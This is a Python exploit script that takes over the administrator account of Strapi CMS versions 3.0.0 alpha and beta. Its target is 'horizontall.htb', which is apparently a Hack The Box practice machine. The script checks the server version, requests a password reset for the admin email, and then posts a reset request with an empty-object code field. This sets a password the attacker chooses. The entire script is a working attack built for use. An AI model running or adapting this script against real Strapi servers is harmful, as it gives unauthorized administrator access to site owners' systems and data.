#!/usr/bin/python

import requests
import sys
import json

userEmail = "admin@horizontall.htb"
strapiUrl = "http://api-prod.horizontall.htb/admin/auth/login"
newPassword = "administrador44"

s = requests.Session()

# Get strapi version
strapiVersion = json.loads(s.get("{}/admin/strapiVersion".format(strapiUrl)).text)

print("[*] strapi version: {}".format(strapiVersion["strapiVersion"]))

# Validate vulnerable version
if strapiVersion["strapiVersion"].startswith('3.0.0-beta') or strapiVersion["strapiVersion"].startswith('3.0.0-alpha'):
  # Password reset
  print("[*] Password reset for user: {}".format(userEmail))
  resetPasswordReq={"email":userEmail, "url":"{}/admin/plugins/users-permissions/auth/reset-password".format(strapiUrl)}
  s.post("{}/".format(strapiUrl), json=resetPasswordReq)

  # Set new password
  print("[*] Setting new password")
  exploit={"code":{}, "password":newPassword, "passwordConfirmation":newPassword}
  r=s.post("{}/admin/auth/reset-password".format(strapiUrl), json=exploit)

  # Check if the password has changed
  if "username" in str(r.content):
    print("[+] New password '{}' set for user {}".format(newPassword, userEmail))
  else:
    print("\033[91m[-] Something went wrong\033[0m")
    sys.exit(1)
else:
  print("\033[91m[-] This version is not vulnerable\033[0m")
  sys.exit(1)
